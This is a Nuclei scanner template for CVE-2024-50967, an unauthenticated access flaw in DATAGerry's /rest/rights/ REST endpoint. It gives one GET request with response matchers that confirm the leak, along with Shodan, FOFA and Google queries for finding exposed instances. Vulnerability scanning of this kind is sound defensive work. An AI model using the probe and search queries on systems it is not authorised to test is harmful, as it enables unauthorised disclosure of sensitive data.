id: CVE-2024-50967

info:
  name: DATAGERRY - Improper Access Control
  author: s4e-io,0xByteHunter
  severity: high
  description: |
    The /rest/rights/ REST API endpoint in Becon DATAGerry through 2.2.0 contains an Incorrect Access Control vulnerability. An attacker can remotely access this endpoint without authentication, leading to unauthorized disclosure of sensitive information.
  impact: |
    Attackers can exploit this vulnerability to compromise system security and integrity.
  remediation: |
    Apply the latest security patches and updates to address this vulnerability.
  reference:
    - https://medium.com/@0xbytehunter/my-first-cve-discovery-of-broken-access-control-in-the-datagerry-platform-7b0404f88a43
    - https://github.com/0xByteHunter/CVE-2024-50967
    - https://nvd.nist.gov/vuln/detail/CVE-2024-50967
  classification:
    cve-id: CVE-2024-50967
    cwe-id: CWE-200
    epss-score: 0.40308
    epss-percentile: 0.97255
  metadata:
    verified: true
    max-request: 1
    vendor: becon
    product: datagerry
    shodan-query: http.title:"datagerry"
    fofa-query: title="datagerry"
    google-query: intitle:"datagerry"
  tags: cve,cve2024,datagerry,auth-bypass,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/rest/rights/"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"response_type":'
          - '"model":'
          - '"time":'
        condition: and

      - type: word
        part: content_type
        words:
          - "application/json"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100c79307470f56dab9582ccddcc8c6eb7be214d79c7f9d2a6137dd3149da02b16a0221008b2f4782826c7151703eb6e914aa5ad4e85bad48d51bedc8be1f8595f2211856:922c64590222798bb761d5b6d8e72950